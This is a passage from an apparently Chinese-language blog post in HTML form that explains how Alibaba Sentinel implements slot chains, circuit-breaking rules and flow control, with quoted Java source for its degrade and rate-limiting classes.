class=\"params\">(Context context, ResourceWrapper resourceWrapper, <span class=\"type\">int</span> count, Object... args)</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Means finish of &#123;<span class=\"doctag\">@link</span> #exit(Context, ResourceWrapper, int, Object...)&#125;.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> context         current &#123;<span class=\"doctag\">@link</span> Context&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> resourceWrapper current resource</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> count           tokens needed</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> args            parameters of the original call</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">fireExit</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, <span class=\"type\">int</span> count, Object... args)</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>总体的框架如下:</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/3.png\" alt=\"结构图\"></p>\n<p>Sentinel 将 SlotChainBuilder 作为 SPI 接口进行扩展，使得 Slot Chain 具备了扩展的能力。您可以自行加入自定义的 slot 并编排 slot 间的顺序，从而可以给 Sentinel 添加自定义的功能。</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/4.png\" alt=\"Sentinel图\"></p>\n<h4 id=\"RuleManager-规则管理器\"><a href=\"#RuleManager-规则管理器\" class=\"headerlink\" title=\"RuleManager 规则管理器\"></a>RuleManager 规则管理器</h4><p>每个 Slot 插槽背后都对应着一个 RuleManager 的实现类，简单理解就是每个 Slot 有一套规则，规则验证处理由对应的 RuleManager 来进行处理。</p>\n<p>流量控制：FlowSolt 对应 FlowRuleManager</p>\n<p>降级控制：DegradeSlot  对应 DegradeRuleManager</p>\n<p>权限控制：AuthoritySlot 对应 AuthorityRuleManager</p>\n<p>系统规则控制： SystemSlot 对应 SystemRuleManager</p>\n<h4 id=\"降级控制实现原理\"><a href=\"#降级控制实现原理\" class=\"headerlink\" title=\"降级控制实现原理\"></a>降级控制实现原理</h4><ol>\n<li>新增资源配置降级规则，目前对于降级策有如下三种：</li>\n</ol>\n<p>RT：平均响应时间 (DEGRADE_GRADE_RT)：当 1s 内持续进入 5 个请求，对应时刻的平均响应时间（秒级）均超过阈值（count，以 ms 为单位），那么在接下的时间窗口（DegradeRule 中的 timeWindow，以 s 为单位）之内，对这个方法的调用都会自动地熔断（抛出 DegradeException）。注意 Sentinel 默认统计的 RT 上限是 4900 ms，超出此阈值的都会算作 4900 ms，若需要变更此上限可以通过启动配置项 -Dcsp.sentinel.statistic.max.rt&#x3D;xxx 来配置。</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/5.png\" alt=\"平均响应图\"></p>\n<p>异常比例：当资源的每秒请求量 &gt;&#x3D; 5，并且每秒异常总数占通过量的比值超过阈值（DegradeRule 中的 count）之后，资源进入降级状态，即在接下的时间窗口（DegradeRule 中的 timeWindow，以 s 为单位）之内，对这个方法的调用都会自动地返回。异常比率的阈值范围是 [0.0, 1.0]，代表 0% - 100%。</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/6.png\" alt=\"异常比例图\"></p>\n<p>异常数：当资源近 1 分钟的异常数目超过阈值之后会进行熔断。注意由于统计时间窗口是分钟级别的，若 timeWindow 小于 60s，则结束熔断状态后仍可能再进入熔断状态。</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/7.png\" alt=\"异常数图\"></p>\n<p>限流结果信息</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">Blocked by Sentinel (flow limiting)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>实现逻辑</li>\n</ol>\n<p>在之前我们已经提及 Sentinel 是通过 slot 链来实现的，对于降级功能其提供了 DegradeSlot，实现源码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DegradeSlot</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractLinkedProcessorSlot</span>&lt;DefaultNode&gt; &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">entry</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, DefaultNode node, <span class=\"type\">int</span> count, <span class=\"type\">boolean</span> prioritized, Object... args)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">        DegradeRuleManager.checkDegrade(resourceWrapper, context, node, count);</span><br><span class=\"line\">        fireEntry(context, resourceWrapper, node, count, prioritized, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">exit</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, <span class=\"type\">int</span> count, Object... args)</span> &#123;</span><br><span class=\"line\">        fireExit(context, resourceWrapper, count, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过上面代码我们可以了解到，限流规则的实现是在 DegradeRuleManager 的checkDegrade中来处理的，限流可以-配置多个规则，依次按照规则来处理。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkDegrade</span><span class=\"params\">(ResourceWrapper resource, Context context, DefaultNode node, <span class=\"type\">int</span> count)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> BlockException &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">        Set&lt;DegradeRule&gt; rules = degradeRules.get(resource.getName());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (rules == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">for</span> (DegradeRule rule : rules) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!rule.passCheck(context, node, count)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DegradeException</span>(rule.getLimitApp(), rule);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>在 DegradeRule 的 passCheck 方法中我们可以看到可以根据 RT、异常数和异常比例来进行熔断降级处理。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">passCheck</span><span class=\"params\">(Context context, DefaultNode node, <span class=\"type\">int</span> acquireCount, Object... args)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cut.get()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"type\">ClusterNode</span> <span class=\"variable\">clusterNode</span> <span class=\"operator\">=</span> ClusterBuilderSlot.getClusterNode(<span class=\"built_in\">this</span>.getResource());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clusterNode == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">\t\t<span class=\"comment\">// 请求处理时间</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (grade == RuleConstant.DEGRADE_GRADE_RT) &#123;</span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">rt</span> <span class=\"operator\">=</span> clusterNode.avgRt();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (rt &lt; <span class=\"built_in\">this</span>.count) &#123;</span><br><span class=\"line\">                passCount.set(<span class=\"number\">0</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"comment\">// Sentinel will degrade the service only if count exceeds.</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (passCount.incrementAndGet() &lt; rtSlowRequestAmount) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (grade == RuleConstant.DEGRADE_GRADE_EXCEPTION_RATIO) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//异常比例</span></span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">exception</span> <span class=\"operator\">=</span> clusterNode.exceptionQps();</span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">success</span> <span class=\"operator\">=</span> clusterNode.successQps();</span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">total</span> <span class=\"operator\">=</span> clusterNode.totalQps();</span><br><span class=\"line\">            <span class=\"comment\">// If total amount is less than minRequestAmount, the request will pass.</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (total &lt; minRequestAmount) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"comment\">// In the same aligned statistic time window,</span></span><br><span class=\"line\">            <span class=\"comment\">// &quot;success&quot; (aka. completed count) = exception count + non-exception count (realSuccess)</span></span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">realSuccess</span> <span class=\"operator\">=</span> success - exception;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (realSuccess &lt;= <span class=\"number\">0</span> &amp;&amp; exception &lt; minRequestAmount) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (exception / success &lt; count) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (grade == RuleConstant.DEGRADE_GRADE_EXCEPTION_COUNT) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//异常数</span></span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">exception</span> <span class=\"operator\">=</span> clusterNode.totalException();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (exception &lt; count) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cut.compareAndSet(<span class=\"literal\">false</span>, <span class=\"literal\">true</span>)) &#123;</span><br><span class=\"line\">            <span class=\"type\">ResetTask</span> <span class=\"variable\">resetTask</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ResetTask</span>(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">            pool.schedule(resetTask, timeWindow, TimeUnit.SECONDS);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"流量控制实现原理\"><a href=\"#流量控制实现原理\" class=\"headerlink\" title=\"流量控制实现原理\"></a>流量控制实现原理</h4><p>接下来我们了解学习一下 Sentinel 是如何实现流量控制的</p>\n<p>流量控制（flow control），其原理是监控应用流量的 QPS 或并发线程数等指标，当达到指定的阈值时对流量进行控制，以避免被瞬时的流量高峰冲垮，从而保障应用的高可用性。</p>\n<p>FlowSlot 会根据预设的规则，结合前面 NodeSelectorSlot、ClusterNodeBuilderSlot、StatisticSlot 统计出来的实时信息进行流量控制。</p>\n<p>限流的直接表现是在执行 Entry nodeA &#x3D; SphU.entry(resourceName) 的时候抛出 FlowException 异常。FlowException 是 BlockException 的子类，您可以捕捉 BlockException 来自定义被限流之后的处理逻辑。</p>\n<p>同一个资源可以创建多条限流规则。FlowSlot 会对该资源的所有限流规则依次遍历，直到有规则触发限流或者所有规则遍历完毕。</p>\n<p>一条限流规则主要由下面几个因素组成，我们可以组合这些元素来实现不同的限流效果：</p>\n<ul>\n<li>resource：资源名，即限流规则的作用对象</li>\n<li>count: 限流阈值</li>\n<li>grade: 限流阈值类型（QPS 或并发线程数）</li>\n<li>limitApp: 流控针对的调用来源，若为 default 则不区分调用来源</li>\n<li>strategy: 调用关系限流策略</li>\n<li>controlBehavior: 流量控制效果（直接拒绝、Warm Up、匀速排队）</li>\n</ul>\n<p>流控-QPS配置</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/8.png\" alt=\"QPS配置图\"></p>\n<p>流控-线程数配置</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/9.png\" alt=\"流控图\"></p>\n<h5 id=\"实现流程\"><a href=\"#实现流程\" class=\"headerlink\" title=\"实现流程\"></a>实现流程</h5><p>Sentinel 提供了 FlowSlot 用来进行流量控制，流量规则的最终实现在 FlowRuleChecker 的 checkFlow 中实现的。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FlowSlot</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractLinkedProcessorSlot</span>&lt;DefaultNode&gt; &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> FlowRuleChecker checker;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">FlowSlot</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FlowRuleChecker</span>());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Package-private for test.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> checker flow rule checker</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@since</span> 1.6.1</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    FlowSlot(FlowRuleChecker checker) &#123;</span><br><span class=\"line\">        AssertUtil.notNull(checker, <span class=\"string\">&quot;flow checker should not be null&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.checker = checker;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">entry</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, DefaultNode node, <span class=\"type\">int</span> count,</span></span><br><span class=\"line\"><span class=\"params\">                      <span class=\"type\">boolean</span> prioritized, Object... args)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">        checkFlow(resourceWrapper, context, node, count, prioritized);</span><br><span class=\"line\"> </span><br><span class=\"line\">        fireEntry(context, resourceWrapper, node, count, prioritized, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">checkFlow</span><span class=\"params\">(ResourceWrapper resource, Context context, DefaultNode node, <span class=\"type\">int</span> count, <span class=\"type\">boolean</span> prioritized)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> BlockException &#123;</span><br><span class=\"line\">        checker.checkFlow(ruleProvider, resource, context, node, count, prioritized);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">exit</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, <span class=\"type\">int</span> count, Object... args)</span> &#123;</span><br><span class=\"line\">        fireExit(context, resourceWrapper, count, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Function&lt;String, Collection&lt;FlowRule&gt;&gt; ruleProvider = <span class=\"keyword\">new</span> <span class=\"title class_\">Function</span>&lt;String, Collection&lt;FlowRule&gt;&gt;() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> Collection&lt;FlowRule&gt; <span class=\"title function_\">apply</span><span class=\"params\">(String resource)</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Flow rule map should not be null.</span></span><br><span class=\"line\">            Map&lt;String, List&lt;FlowRule&gt;&gt; flowRules = FlowRuleManager.getFlowRuleMap();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> flowRules.get(resource);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在 checkFlow 中会依次获取我们配置的流控规则，然后依次进行流控判断处理，如果被流控则抛出异常 FlowException</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkFlow</span><span class=\"params\">(Function&lt;String, Collection&lt;FlowRule&gt;&gt; ruleProvider, ResourceWrapper resource,</span></span><br><span class=\"line\"><span class=\"params\">                          Context context, DefaultNode node, <span class=\"type\">int</span> count, <span class=\"type\">boolean</span> prioritized)</span> <span class=\"keyword\">throws</span> BlockException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ruleProvider == <span class=\"literal\">null</span> || resource == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Collection&lt;FlowRule&gt; rules = ruleProvider.apply(resource.getName());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (rules != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (FlowRule rule : rules) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!canPassCheck(rule, context, node, count, prioritized)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FlowException</span>(rule.getLimitApp(), rule);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>在 canPassCheck 中会判断是集群限流还是本地限流</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">canPassCheck</span><span class=\"params\">(<span class=\"comment\">/*@NonNull*/</span> FlowRule rule, Context context, DefaultNode node, <span class=\"type\">int</span> acquireCount,</span></span><br><span class=\"line\"><span class=\"params\">                                                    <span class=\"type\">boolean</span> prioritized)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">limitApp</span> <span class=\"operator\">=</span> rule.getLimitApp();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (limitApp == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (rule.isClusterMode()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> passClusterCheck(rule, context, node, acquireCount, prioritized);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">return</span> passLocalCheck(rule, context, node, acquireCount, prioritized);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>如果是本地限流则获取节点信息，然后根据流控规则进行流控判断</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">passLocalCheck</span><span class=\"params\">(FlowRule rule, Context context, DefaultNode node, <span class=\"type\">int</span> acquireCount,</span></span><br><span class=\"line\"><span class=\"params\">                                          <span class=\"type\">boolean</span> prioritized)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Node</span> <span class=\"variable\">selectedNode</span> <span class=\"operator\">=</span> selectNodeByRequesterAndStrategy(rule, context, node);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (selectedNode == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">return</span> rule.getRater().canPass(selectedNode, acquireCount, prioritized);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>当 QPS 超过某个阈值的时候，则采取措施进行流量控制。流量控制的手段包括以下几种：直接拒绝、Warm Up、匀速排队。对应 FlowRule 中的 controlBehavior 字段。</p>\n<p>直接拒绝（RuleConstant.CONTROL_BEHAVIOR_DEFAULT）方式是默认的流量控制方式，当QPS超过任意规则的阈值后，新的请求就会被立即拒绝，拒绝方式为抛出FlowException。这种方式适用于对系统处理能力确切已知的情况下，比如通过压测确定了系统的准确水位时。具体的例子参见 FlowQpsDemo。</p>\n<p>Warm Up（RuleConstant.CONTROL_BEHAVIOR_WARM_UP）方式，即预热&#x2F;冷启动方式。当系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过”冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。详细文档可以参考 流量控制 - Warm Up 文档</p>\n<p>目前 Sentinel 对于流量控制提供了如下几种方式：</p>\n<ul>\n<li>直接拒绝（DefaultController）：支持抛出异常<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">canPass</span><span class=\"params\">(Node node, <span class=\"type\">int</span> acquireCount, <span class=\"type\">boolean</span> prioritized)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">curCount</span> <span class=\"operator\">=</span> avgUsedTokens(node);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (curCount + acquireCount &gt; count) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (prioritized &amp;&amp; grade == RuleConstant.FLOW_GRADE_QPS) &#123;</span><br><span class=\"line\">            <span class=\"type\">long</span> currentTime;</span><br><span class=\"line\">            <span class=\"type\">long</span> waitInMs;</span><br><span class=\"line\">            currentTime = TimeUtil.currentTimeMillis();</span><br><span class=\"line\">            waitInMs = node.tryOccupyNext(currentTime, acquireCount, count);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (waitInMs &lt; OccupyTimeoutProperty.getOccupyTimeout()) &#123;</span><br><span class=\"line\">                node.addWaitingRequest(currentTime + waitInMs, acquireCount);</span><br><span class=\"line\">                node.addOccupiedPass(acquireCount);</span><br><span class=\"line\">                sleep(waitInMs);</span><br><span class=\"line\"> </span><br><span class=\"line\">                <span class=\"comment\">// PriorityWaitException indicates that the request will pass after waiting for &#123;@link @waitInMs&#125;.</span></span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PriorityWaitException</span>(waitInMs);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li>匀速排队（RateLimiterController）：判断等待时间，如果等待时间过长也是会限流，并且使用 Thread.sleep 如果配置不正确可能会导致线程过多。<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">canPass</span><span class=\"params\">(Node node, <span class=\"type\">int</span> acquireCount, <span class=\"type\">boolean</span> prioritized)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Pass when acquire count is less or equal than 0.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (acquireCount &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// Reject when count is less or equal than 0.</span></span><br><span class=\"line\">        <span class=\"comment\">// Otherwise,the costTime will be max of long and waitTime will overflow in some cases.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (count &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">currentTime</span> <span class=\"operator\">=</span> TimeUtil.currentTimeMillis();</span><br><span class=\"line\">        <span class=\"comment\">// Calculate the interval between every two requests.</span></span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">costTime</span> <span class=\"operator\">=</span> Math.round(<span class=\"number\">1.0</span> * (acquireCount) / count * <span class=\"number\">1000</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"comment\">// Expected pass time of this request.</span></span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">expectedTime</span> <span class=\"operator\">=</span> costTime + latestPassedTime.get();</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (expectedTime &lt;= currentTime) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Contention may exist here, but it&#x27;s okay.</span></span><br><span class=\"line\">            latestPassedTime.set(currentTime);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Calculate the time to wait.</span></span><br><span class=\"line\">            <span class=\"type\">long</span> <span class=\"variable\">waitTime</span> <span class=\"operator\">=</span> costTime + latestPassedTime.get() - TimeUtil.currentTimeMillis();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (waitTime &gt; maxQueueingTimeMs) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">long</span> <span class=\"variable\">oldTime</span> <span class=\"operator\">=</span> latestPassedTime.addAndGet(costTime);</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    waitTime = oldTime - TimeUtil.currentTimeMillis();</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (waitTime &gt; maxQueueingTimeMs) &#123;</span><br><span class=\"line\">                        latestPassedTime.addAndGet(-costTime);</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// in race condition waitTime may &lt;= 0</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (waitTime &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        Thread.sleep(waitTime);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) 